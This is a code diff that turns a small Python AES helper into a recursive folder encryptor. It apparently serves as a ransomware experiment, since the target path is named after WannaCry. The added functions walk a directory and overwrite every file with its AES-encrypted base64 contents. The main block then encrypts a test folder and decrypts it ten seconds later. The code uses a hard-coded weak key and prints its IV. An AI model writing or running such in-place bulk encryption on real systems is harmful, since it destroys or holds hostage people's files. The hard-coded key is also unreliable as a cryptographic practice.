@@ -2,6 +2,8 @@ from Crypto.Cipher import AES
 from binascii import b2a_hex,a2b_hex
 from Crypto import Random
 import base64
+import os
+import time
 
 
 class AesEncryption(object):
@@ -9,8 +11,9 @@ class AesEncryption(object):
         self.key = self.check_key(key)
         # 密钥key长度必须为16,24或者32bytes的长度
         self.mode = mode
+        #self.iv = b'7#7FqXu\x06\x847-\xba\xe5\x07\xeb\xa7'
         self.iv = Random.new().read(AES.block_size)
-        print(Random.new().read(AES.block_size))
+        print(self.iv)
 
     def check_key(self, key):
         '检测key的长度是否为16,24或者32bytes的长度'
@@ -47,25 +50,45 @@ class AesEncryption(object):
         cryptor = AES.new(self.key, self.mode,self.iv)
         return cryptor.decrypt(a2b_hex(data)).decode()
 
+
+
+def get_file_path(path):
+    filelist = []    
+    for root, dirs, files in os.walk(path):
+        for name in files:
+            filelist.append(os.path.join(root, name))
+    return filelist
+
+
+def en_file(filelist):
+    for name in filelist:
+            with open(name,"rb") as f:
+                base64_data = base64.b64encode(f.read())
+                data = base64_data
+            with open(name,"w") as f:
+                e = aes.encrypt(data)
+                f.write(e)
+                f.close()
+
+
+def de_file(filelist):    
+    for name in filelist:
+            with open(name,"rb") as f:
+                d = aes.decrypt(f.read())                
+                base64_data = base64.b64decode(d)
+                data = base64_data
+            with open(name,"wb") as f:
+                f.write(data)
+                f.close()
+
+            
 if __name__ == '__main__':
-    key = '1234567890123456'
-    #data = open('2.png','rb').read()
-    #data = 'abc,123你真帅'
-    #image转base64
-
-    with open("2 - 副本.png","rb") as f:
-        base64_data = base64.b64encode(f.read())
-  # base64.b64decode(base64data)
-        #print(base64_data)
-        data = base64_data
-    #aes = AesEncryption(key)
-   # e = aes.encrypt(data)  # 调用加密函数
-    #d = aes.decrypt(e)  # 调用解密函数
-    #print(type(e))
-    with open("2 - 副本.png","w") as f:
-        aes = AesEncryption(key)
-        e = aes.encrypt(data)
-        f.write(e)
-
-             
-    #print(d)
+    key = '1234567890123456'     #密钥
+    path = r"F:\ASUS\Desktop\coding\wana cry\test"
+    aes = AesEncryption(key)
+    filelist = get_file_path(path)
+    en_file(filelist)
+    print('encrypt finish')
+    time.sleep(10)
+    de_file(filelist)
+    print('decrypt finish')
